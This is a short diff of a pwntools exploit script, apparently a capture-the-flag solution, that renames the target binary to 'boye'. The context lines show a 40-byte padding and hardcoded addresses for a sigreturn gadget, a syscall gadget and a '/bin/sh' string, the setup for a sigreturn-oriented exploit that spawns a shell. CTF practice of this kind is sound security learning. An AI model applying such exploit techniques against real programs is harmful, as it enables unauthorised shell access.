@@ -1,6 +1,6 @@
 from pwn import *
 
-r = process("./boyei")
+r = process("./boye")
 
 #r = remote("localhost", 1337)
 
@@ -10,7 +10,7 @@ padding = 'A' * 40
 sigrop = 0x400180
 syscall = 0x400185
 
-#binary = ELF("./sigrop")
+#binary = ELF("./boye")
 #binsh = binary.symbols['useful_string']
 binsh = 0x4001ca
 
